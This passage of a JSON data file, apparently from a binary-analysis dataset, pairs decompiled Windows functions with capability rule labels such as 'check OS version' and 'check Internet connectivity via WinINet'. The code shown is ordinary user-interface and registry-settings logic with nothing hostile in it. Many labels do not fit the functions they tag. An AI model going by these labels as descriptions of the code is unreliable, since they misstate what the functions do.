        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042cbbe(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(extraout_ECX + 0x80) = *(unaff_EBP + 8);\n    if (*(extraout_ECX + 0x8c) == 0) {\n        iVar1 = fcn.0041bab6(0xb0);\n        *(unaff_EBP + 8) = iVar1;\n        *(unaff_EBP + -4) = 0;\n        if (iVar1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = fcn.0042f3b5(extraout_ECX);\n        }\n        *(extraout_ECX + 0x8c) = uVar2;\n    }\n    if (*(extraout_ECX + 0x34) == 0) {\n        uVar2 = (*_sym.imp.USER32.dll_GetParent)(*(extraout_ECX + 0x1c));\n        *(extraout_ECX + 0x34) = uVar2;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 328
    },
    "0042cfac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042cfac(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    \n    if (arg_8h == 2) {\n        fcn.0041fe88();\n        if ((*(in_ECX + 0x15c) & 0x40) == 0) {\n            iVar2 = 1;\n            iVar1 = 0;\n            do {\n                if (*(in_ECX + 0x17c) <= iVar2) break;\n                iVar1 = fcn.0042ce39();\n                iVar2 = iVar2 + 1;\n            } while (iVar1 == 0);\n            (****(iVar1 + 0x8c))(arg_ch, arg_10h);\n            return;\n        }\n    }\n    else if ((9 < arg_8h) && (arg_8h < 0x12)) {\n        fcn.0041fe88();\n        iVar2 = 1;\n        iVar1 = 0;\n        do {\n            if (*(in_ECX + 0x17c) <= iVar2) break;\n            iVar1 = fcn.0042ce39();\n            iVar2 = iVar2 + 1;\n        } while (iVar1 == 0);\n        (**(**(iVar1 + 0x8c) + 4))(arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    fcn.0041ee14();\n    return;\n}\n",
        "token_count": 344
    },
    "0042d179": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0042d179(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (0xffff < param_1) {\n        param_1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(param_1 + 0x1c));\n        param_1 = param_1 & 0xffff;\n    }\n    iVar1 = fcn.0042cdfc(param_1, 0xffffffff);\n    if (0 < iVar1) {\n        fcn.0041b25b(iVar1, 1);\n        piVar2 = fcn.004089fd(iVar1 + -1);\n        if (*piVar2 == 0) {\n            piVar2 = fcn.004089fd(iVar1);\n            if (*piVar2 == 0) {\n                fcn.0041b25b(iVar1, 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "0042d1e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042d1e0(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t *in_ECX;\n    \n    iVar4 = arg_8h;\n    iVar1 = fcn.0042cdfc(arg_8h, arg_ch);\n    if (arg_10h == 1) {\n        puVar2 = fcn.004089fd(iVar1);\n        uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(arg_8h + 0x1c));\n        *puVar2 = uVar3 & 0xffff;\n        fcn.004089fd(iVar1);\n        iVar4 = fcn.0042cdfc(iVar4, iVar1);\n        if (0 < iVar4) {\n            fcn.0041b25b(iVar1, 1);\n            piVar5 = fcn.004089fd();\n            if ((*piVar5 == 0) && (piVar5 = fcn.004089fd(),  *piVar5 == 0)) {\n                fcn.0041b25b(iVar1, 1);\n            }\n        }\n    }\n    else {\n        fcn.0041b25b(iVar1, 1);\n        piVar5 = fcn.004089fd(iVar1 + -1);\n        if ((*piVar5 == 0) && (piVar5 = fcn.004089fd(iVar1),  *piVar5 == 0)) {\n            fcn.0041b25b(iVar1, 1);\n        }\n        if (arg_10h != -1) {\n            fcn.0042d179(arg_8h);\n        }\n    }\n    if (*(arg_8h + 0x8c) != 0) {\n        piVar5 = fcn.004319c3();\n        if ((in_ECX[0x24] == 0) || (iVar4 = (**(*in_ECX + 0x168))(),  iVar4 != 0)) {\n            piVar5[0x33] = piVar5[0x33] | 0xc;\n        }\n        else {\n            iVar4 = fcn.0042d111();\n            if (iVar4 == 0) {\n                (**(*piVar5 + 0x60))();\n                return 1;\n            }\n            fcn.0041cdb9(0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 586
    },
    "0042dabb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042dabb(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint uFlags;\n    uchar auStack300 [16];\n    int32_t iStack284;\n    int32_t iStack280;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [260];\n    uint uStack8;\n    \n    uStack8 = *0x44e0fc;\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(param_2 + 0x1c), auStack300);\n    if (*(param_2 + 0x88) == param_1) {\n        if (param_3 == 0) goto code_r0x0042dcc4;\n        iVar2 = (*_sym.imp.USER32.dll_EqualRect)(auStack300, param_3);\n        if (iVar2 != 0) goto code_r0x0042dcc4;\n    }\n    if ((*(param_1 + 0x90) != 0) && ((*(param_2 + 0x80) & 0x40) != 0)) {\n        *(param_1 + 0x7c) = *(param_1 + 0x7c) | 0x40;\n    }\n    *(param_1 + 0x7c) = *(param_1 + 0x7c) & 0xfffffff9;\n    uVar3 = *(param_1 + 0x7c);\n    *(param_1 + 0x7c) = *(param_2 + 0x7c) & 6 | uVar3;\n    if ((uVar3 & 0x40) == 0) {\n        fcn.0041ceb4(auStack268, 0x104);\n        fcn.00426d35(*(param_1 + 0x1c), auStack268);\n    }\n    uVar3 = (*(param_2 + 0x7c) ^ *(param_1 + 0x7c)) & 0xf000 ^ *(param_2 + 0x7c);\n    if (*(param_1 + 0x90) == 0) {\n        uVar3 = uVar3 & 0xfffffffe | 0xf00;\n    }\n    else {\n        uVar3 = uVar3 | 0xf01;\n    }\n    fcn.00437219(uVar3);\n    uVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(param_2 + 0x1c), 0xffffffff);\n    iVar2 = fcn.0042cdfc(uVar1);\n    if (0 < iVar2) {\n        piVar4 = fcn.004089fd(iVar2);\n        *piVar4 = param_2;\n    }\n    if (param_3 == 0) {\n        if (iVar2 < 1) {\n            fcn.0041aff5(*(param_1 + 0x9c), param_2);\n            fcn.0041aff5(*(param_1 + 0x9c), 0);\n        }\n        uFlags = 0x115;\n        iStack272 = 0;\n        iStack276 = 0;\n        iStack280 = -*0x450d4c;\n        iStack284 = -*0x450d48;\n    }\n    else {\n        (*_sym.imp.USER32.dll_CopyRect)(&iStack284, param_3);\n        fcn.00426186();\n        if (iVar2 < 1) {\n            fcn.0042ce58(param_2, iStack284, iStack280, iStack276, iStack272, (iStack276 - iStack284) / 2 + iStack284, \n                         (iStack272 - iStack280) / 2 + iStack280);\n        }\n        iStack272 = iStack272 - iStack280;\n        uFlags = 0x114;\n        iStack276 = iStack276 - iStack284;\n    }\n    fcn.0041ce37(0, iStack284, iStack280, iStack276, iStack272, uFlags);\n    (*_sym.imp.USER32.dll_GetParent)(*(param_2 + 0x1c));\n    iVar2 = fcn.0041eeb7();\n    if (iVar2 != param_1) {\n        fcn.00409850(param_1);\n    }\n    if (*(param_2 + 0x88) != 0) {\n        fcn.0042d1e0(param_2, 0xffffffff, 0);\n    }\n    *(param_2 + 0x88) = param_1;\n    iVar2 = fcn.004319c3();\n    *(iVar2 + 0xcc) = *(iVar2 + 0xcc) | 0xc;\ncode_r0x0042dcc4:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 1121
    },
    "0042de8e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042de8e(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    iVar1 = arg_8h;\n    fcn.0041cc71(arg_8h, &arg_8h);\n    if (arg_8h == 0) {\n        iVar2 = fcn.0041cc3a(iVar1);\n        if (iVar2 == 0) {\n            fcn.004198cc();\n        }\n    }\n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 8) = iVar1;\n    return arg_8h;\n}\n",
        "token_count": 159
    },
    "0042decd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042decd(int32_t *param_1)\n\n{\n    int32_t *hWnd;\n    \n    hWnd = param_1;\n    if ((*param_1 != 0) && (param_1[2] != 0)) {\n        fcn.0041cc71(param_1[2], &hWnd);\n        if (hWnd != NULL) {\n            (*_sym.imp.USER32.dll_SetFocus)(hWnd);\n            if (param_1[3] != 0) {\n                (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0xb1, 0, 0xffffffff);\n            }\n        }\n    }\n    fcn.00425f38();\n    return;\n}\n",
        "token_count": 160
    },
    "0042df33": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042df33(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint arg_10h_00;\n    uint hWnd;\n    int32_t iVar1;\n    uint lpString;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    hWnd = fcn.0042df1c(arg_ch);\n    arg_10h_00 = arg_18h;\n    if (*arg_8h == 0) {\n        fcn.0040caac(&lpString, arg_10h, &arg_18h);\n        fcn.00426d35(hWnd, &lpString);\n    }\n    else {\n        (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, &lpString, 0x40);\n        iVar1 = fcn.0040c773(&lpString, arg_10h, arg_10h_00);\n        if (iVar1 != 1) {\n            fcn.00427980(arg_14h, 0, 0xffffffff);\n            fcn.0042decd();\n        }\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 279
    },
    "0042dfbc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042dfbc(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.0042df33(arg_8h, arg_ch, 0x441ad0, 0xf110, arg_10h);\n    return;\n}\n",
        "token_count": 95
    },
    "0042dfeb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_90h\n\nvoid __cdecl\nfcn.0042dfeb(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_90h;\n    uint var_50h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    iVar2 = **(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = *0x44e0fc;\n    if (iVar2 != 0) {\n        fcn.0040c999(unaff_EBP + -0x90, *(unaff_EBP + 0x1c), *(unaff_EBP + 0xc));\n        fcn.0040c999(unaff_EBP + -0x50, *(unaff_EBP + 0x1c), *(unaff_EBP + 0x14));\n        piVar1 = fcn.0041bc88();\n        iVar2 = (**(*piVar1 + 0xc))();\n        *(unaff_EBP + 8) = iVar2 + 0x10;\n        *(unaff_EBP + -4) = 0;\n        fcn.0042e375(unaff_EBP + 8, *(unaff_EBP + 0x20), unaff_EBP + -0x90, unaff_EBP + -0x50);\n        fcn.0042795e(*(unaff_EBP + 8), 0x30, *(unaff_EBP + 0x20));\n        fcn.004014a0();\n        fcn.0042decd();\n        fcn.00401180();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 470
    },
    "0042e1a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e1a6(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint hWnd;\n    int32_t iVar1;\n    uint uVar2;\n    \n    hWnd = fcn.0042df1c(arg_ch);\n    if (*arg_8h == 0) {\n        fcn.00426d35(hWnd, *arg_10h);\n    }\n    else {\n        iVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(hWnd);\n        uVar2 = fcn.00408978(iVar1, iVar1 + 1);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, uVar2);\n        fcn.00407fe0(0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "0042e1f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e1f8(int32_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    iVar4 = 0;\n    uVar1 = *arg_ch;\n    puVar5 = arg_ch;\n    while (uVar1 != 0) {\n        if (*puVar5 == 0x25) {\n            uVar1 = puVar5[1];\n            if ((uVar1 < '1') || ('9' < uVar1)) {\n                if ((uVar1 < 'A') || ('Z' < uVar1)) goto code_r0x0042e251;\n                if (uVar1 < ':') goto code_r0x0042e22f;\n                iVar3 = uVar1 + -0x38;\n            }\n            else {\ncode_r0x0042e22f:\n                iVar3 = uVar1 + -0x31;\n            }\n            puVar5 = puVar5 + 2;\n            if (arg_14h <= iVar3) goto code_r0x0042e260;\n            iVar3 = *(arg_10h + iVar3 * 4);\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar3);\n                iVar4 = iVar4 + iVar3;\n            }\n        }\n        else {\ncode_r0x0042e251:\n            if ((*(*puVar5 + 0x4527e1) & 4) != 0) {\n                iVar4 = iVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = puVar5 + 1;\ncode_r0x0042e260:\n            iVar4 = iVar4 + 1;\n        }\n        uVar1 = *puVar5;\n    }\n    puVar5 = fcn.004026d0(iVar4);\n    do {\n        while( true ) {\n            if (*arg_ch == 0) {\n                fcn.00407fe0(puVar5 - *arg_8h);\n                return;\n            }\n            uVar1 = *arg_ch;\n            if (uVar1 == 0x25) break;\ncode_r0x0042e2cb:\n            if ((*(uVar1 + 0x4527e1) & 4) != 0) {\n                *puVar5 = uVar1;\n                puVar5 = puVar5 + 1;\n                arg_ch = arg_ch + 1;\n            }\n            *puVar5 = *arg_ch;\n            puVar5 = puVar5 + 1;\n            arg_ch = arg_ch + 1;\n        }\n        uVar2 = arg_ch[1];\n        if ((uVar2 < '1') || ('9' < uVar2)) {\n            if ((uVar2 < 'A') || ('Z' < uVar2)) goto code_r0x0042e2cb;\n            if (uVar2 < ':') goto code_r0x0042e29b;\n            iVar4 = uVar2 + -0x38;\n        }\n        else {\ncode_r0x0042e29b:\n            iVar4 = uVar2 + -0x31;\n        }\n        arg_ch = arg_ch + 2;\n        if (iVar4 < arg_14h) {\n            iVar4 = *(arg_10h + iVar4 * 4);\n            if (iVar4 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar5, iVar4);\n                iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar5);\n                puVar5 = puVar5 + iVar4;\n            }\n        }\n        else {\n            *puVar5 = 0x3f;\n            puVar5 = puVar5 + 1;\n        }\n    } while( true );\n}\n",
        "token_count": 903
    },
    "0042e39b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e39b(uint lpAppName, uint lpValueName, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint lpString;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    if (*(in_ECX + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_wsprintfA)(&lpString, 0x441ad0, arg_10h);\n        (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(lpAppName, lpValueName, &lpString, *(in_ECX + 100));\n    }\n    else {\n        iVar1 = fcn.00437c61(lpAppName);\n        if (iVar1 != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(iVar1, lpValueName, 0, 4, &arg_10h, 4);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n        }\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 251
    },
    "0042e41d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0042e41d(uint lpAppName, int32_t lpValueName, int32_t lpString)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(lpAppName, lpValueName, lpString, *(in_ECX + 100));\n        return uVar3;\n    }\n    if (lpValueName == 0) {\n        iVar1 = fcn.00437bd0();\n        if (iVar1 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(iVar1, lpAppName);\n            goto code_r0x0042e489;\n        }\n    }\n    else {\n        iVar1 = fcn.00437c61(lpAppName);\n        if (lpString == 0) {\n            if (iVar1 != 0) {\n                iVar2 = (*_sym.imp.ADVAPI32.dll_RegDeleteValueA)(iVar1, lpValueName);\ncode_r0x0042e489:\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n                return iVar2 == 0;\n            }\n        }\n        else if (iVar1 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(iVar1, lpValueName, 0, 1, lpString, iVar2 + 1);\n            goto code_r0x0042e489;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 388
    },
    "0042e62a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042e62a(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = *(param_1 + 8);\n    iVar3 = 0;\n    var_4h = param_1;\n    while (var_8h != 0) {\n        ppiVar2 = fcn.0040854e(&var_8h);\n        piVar1 = *ppiVar2;\n        var_4h = (**(*piVar1 + 0x54))();\n        while (var_4h != 0) {\n            (**(*piVar1 + 0x58))(&var_4h);\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 206
    },
    "0042f215": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0042f215(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    \n    uVar1 = 0;\n    uVar2 = *(param_1 + 0x78) & 0xa000;\n    if (*(param_1 + 0x7c) != 0) {\n        uVar2 = uVar2 == 0;\n    }\n    if ((uVar2 == 0) || ((*(param_1 + 0x70) & 0xa000) == 0)) {\n        if ((*(param_1 + 0x70) & 0x5000) == 0) goto code_r0x0042f271;\n        uVar1 = *(param_1 + 0x70) & 0xffff5fff;\n        puVar3 = param_1 + 0x38;\n    }\n    else {\n        uVar1 = *(param_1 + 0x70) & 0xffffafff;\n        puVar3 = param_1 + 0x28;\n    }\n    uVar1 = fcn.004340ad(*puVar3, puVar3[1], puVar3[2], puVar3[3], uVar1, 0);\ncode_r0x0042f271:\n    if ((*(param_1 + 0x7c) == 0) && (uVar1 == 0)) {\n        if ((*(param_1 + 0x70) & 0xa000) != 0) {\n            fcn.004340ad(*(param_1 + 0x38), *(param_1 + 0x3c), *(param_1 + 0x40), *(param_1 + 0x44), \n                         *(param_1 + 0x70) & 0xffffafff, 0);\n            uVar2 = *(param_1 + 0x70) & 0xffffafff;\n            uVar1 = fcn.004340ad(*(param_1 + 0x28), *(param_1 + 0x2c), *(param_1 + 0x30), *(param_1 + 0x34), uVar2, 0);\n            uVar1 = ~-(uVar1 != uVar2) & uVar1;\n            if (uVar1 != 0) {\n                return uVar1;\n            }\n        }\n        if ((*(param_1 + 0x70) & 0x5000) != 0) {\n            fcn.004340ad(*(param_1 + 0x28), *(param_1 + 0x2c), *(param_1 + 0x30), *(param_1 + 0x34), \n                         *(param_1 + 0x70) & 0xffff5fff, 0);\n            uVar2 = *(param_1 + 0x70) & 0xffff5fff;\n            uVar1 = fcn.004340ad(*(param_1 + 0x38), *(param_1 + 0x3c), *(param_1 + 0x40), *(param_1 + 0x44), uVar2, 0);\n            uVar1 = ~-(uVar1 != uVar2) & uVar1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 753
    },
    "0042f5bb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f5bb(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t arg_24h;\n    int32_t in_ECX;\n    uint *puVar3;\n    uint lprc;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = 1;\n    var_10h = 1;\n    uVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(0);\n    var_8h = fcn.00426561(uVar2);\n    var_ch = var_8h;\n    var_4h = fcn.00434243();\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if ((*(in_ECX + 0x74) & 0xa000) == 0) {\n        if ((*(in_ECX + 0x74) & 0x5000) == 0) {\n            var_14h = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x20);\n            var_14h = var_14h + -1;\n            var_10h = (*pcVar1)(0x21);\n            var_10h = var_10h + -1;\n            if ((((*(in_ECX + 0x78) & 0xa000) == 0) || (*(in_ECX + 0x7c) != 0)) &&\n               (((*(in_ECX + 0x78) & 0x5000) == 0 || (*(in_ECX + 0x7c) == 0)))) {\n                puVar3 = in_ECX + 0x58;\n            }\n            else {\n                puVar3 = in_ECX + 0x48;\n            }\n            var_8h = var_4h;\n        }\n        else {\n            puVar3 = in_ECX + 0x38;\n        }\n    }\n    else {\n        puVar3 = in_ECX + 0x28;\n    }\n    lprc = *puVar3;\n    uStack36 = puVar3[1];\n    uStack32 = puVar3[2];\n    uStack28 = puVar3[3];\n    if (arg_8h != 0) {\n        var_10h = 0;\n        var_14h = 0;\n    }\n    if ((*(in_ECX + 0x75) & 0xf0) != 0) {\n        (*_sym.imp.USER32.dll_InflateRect)(&lprc, 0xffffffff, 0xffffffff);\n    }\n    arg_24h = var_4h;\n    if (*(in_ECX + 0x24) == 0) {\n        arg_24h = var_ch;\n    }\n    fcn.004342e2(&lprc, var_14h, var_10h, in_ECX + 0xc, *(in_ECX + 0x1c), *(in_ECX + 0x20), var_8h, arg_24h);\n    *(in_ECX + 0xc) = lprc;\n    *(in_ECX + 0x1c) = var_14h;\n    *(in_ECX + 0x10) = uStack36;\n    *(in_ECX + 0x20) = var_10h;\n    *(in_ECX + 0x14) = uStack32;\n    *(in_ECX + 0x18) = uStack28;\n    *(in_ECX + 0x24) = var_8h == var_4h;\n    return;\n}\n",
        "token_count": 847
    },
    "0042f6c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042f6c2(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (*param_2 != param_3) {\n        *param_2 = param_3;\n        if ((((*(param_1 + 0x70) & 0xa000) == 0) || ((*(param_1 + 0x70) & 0x5000) == 0)) || (*(param_1 + 0x7c) == 0)) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = 1;\n        }\n        *(param_1 + 0x7c) = uVar1;\n        if (*(param_1 + 0x80) == 0) {\n            uVar1 = fcn.0042f215();\n        }\n        else {\n            uVar1 = 0;\n        }\n        *(param_1 + 0x74) = uVar1;\n        fcn.0042f5bb(0);\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "0042f714": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f714(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_OffsetRect;\n    iVar4 = arg_8h - *(in_ECX + 4);\n    iVar2 = arg_ch - *(in_ECX + 8);\n    (*_sym.imp.USER32.dll_OffsetRect)(in_ECX + 0x28, iVar4, iVar2);\n    (*pcVar1)(in_ECX + 0x48, iVar4, iVar2);\n    (*pcVar1)(in_ECX + 0x38, iVar4, iVar2);\n    (*pcVar1)(in_ECX + 0x58, iVar4, iVar2);\n    *(in_ECX + 4) = arg_8h;\n    *(in_ECX + 8) = arg_ch;\n    if (*(in_ECX + 0x80) == 0) {\n        uVar3 = fcn.0042f215();\n    }\n    else {\n        uVar3 = 0;\n    }\n    *(in_ECX + 0x74) = uVar3;\n    fcn.0042f5bb(0);\n    return;\n}\n",
        "token_count": 309
    },
    "0042f969": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
